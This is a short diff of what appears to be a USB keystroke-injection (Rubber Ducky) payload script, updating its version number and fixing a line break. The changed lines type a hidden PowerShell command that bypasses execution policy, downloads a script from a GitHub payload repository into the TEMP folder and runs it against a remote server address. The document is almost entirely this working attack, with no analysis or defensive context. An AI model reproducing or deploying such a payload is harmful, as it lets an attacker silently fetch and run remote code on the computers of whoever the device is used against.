@@ -10,7 +10,6 @@ REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING 
-powershell -ExecutionPolicy Bypass -w h -c $d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.7/s2.ps1 -OutFile $d\x2.ps1;& "$d\x2.ps1" -Server http://192.168.0.10:8090
+STRING powershell -ExecutionPolicy Bypass -w h -c $d=$env:TEMP+'\ps';md $d -Force;irm https://raw.githubusercontent.com/cypherfrog112358/hak5-payloads/v1.8/s2.ps1 -OutFile $d\x2.ps1;& "$d\x2.ps1" -Server http://192.168.0.10:8090
 DELAY 500
 ENTER
